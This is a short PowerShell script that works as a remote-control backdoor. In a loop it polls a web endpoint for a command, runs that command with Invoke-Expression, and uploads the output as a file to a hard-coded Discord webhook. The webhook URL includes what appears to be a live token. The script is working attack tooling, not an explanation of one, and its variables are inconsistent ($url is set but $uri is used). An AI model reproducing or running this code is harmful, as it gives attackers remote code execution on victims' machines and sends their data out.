$url = "https://discord.com/api/webhooks/960492664397131816/2I0hpRTNIrzZCiUwkmZ76-gJ7AHAIvr9nFFdV2oVBWUM7l8t3dT3_wX7iS1S0NoaSOSn"

try {
    do {       
        $response = Invoke-WebRequest -Uri $uri
        $jsonObj = ConvertFrom-Json $([String]::new($response.Content))        
        
        $jsonobj | select 'name' | out-file -filepath .\text34.txt
        $jsonobj1 = (Get-Content -Path ".\text34.txt" -tail 3) | Select-object -First 1 
        $files = (Get-Content -Path ".\text34.txt" -tail 3) | Select-object -First 1 | out-file -append gg.txt
        $jsonobj2 = (Get-Content -Path ".\gg.txt" -tail 1) | out-file qna.txt
               
        
        $a = (Get-Content ".\gg.txt" -tail 2)
        $b = (Get-Content ".\gg.txt" -tail 1)
        if ($a -ne $b){
            $rut = IEX($jsonobj1) | out-file sys.txt 
                    
            $fileName = "sys.txt"        
            $currentPath = Convert-Path .
            $filePath="$currentPath\$fileName"
        
            $fileBin = [System.IO.File]::ReadAlltext($filePath)
            $boundary = [System.Guid]::NewGuid().ToString()
            $LF = "`r`n"
            $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
            "Content-Type: application/octet-stream$LF",
            $fileBin,
            "--$boundary--$LF"
            ) -join $LF
        
            Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
        
        }

    } until ( $response.StatusCode -eq [System.Net.HttpStatusCode]::NotFound )
}
catch {
     # catches 404 too
     Write-Debug "StatusCode: $($_.Exception.Response.StatusCode.Value__)"
}
